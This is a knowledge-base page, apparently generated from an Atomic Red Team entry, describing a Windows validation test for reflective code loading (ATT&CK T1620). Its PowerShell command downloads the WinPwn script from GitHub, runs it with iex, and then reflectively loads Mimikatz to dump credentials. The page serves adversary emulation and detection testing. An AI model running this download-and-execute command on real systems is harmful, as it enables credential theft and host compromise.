---
atomic_guid: "56b9589c-9170-4682-8c3d-33b86ecb5119"
title: "WinPwn - Reflectively load Mimik@tz into memory"
framework: "atomic"
generated: "true"
attack_technique_id: "T1620"
attack_technique_name: "Reflective Code Loading"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1620/T1620.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "56b9589c-9170-4682-8c3d-33b86ecb5119"
  - "WinPwn - Reflectively load Mimik@tz into memory"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Reflectively load Mimik@tz into memory technique via function of WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1620-reflective_code_loading|T1620: Reflective Code Loading]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
mimiload -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1620/T1620.yaml)
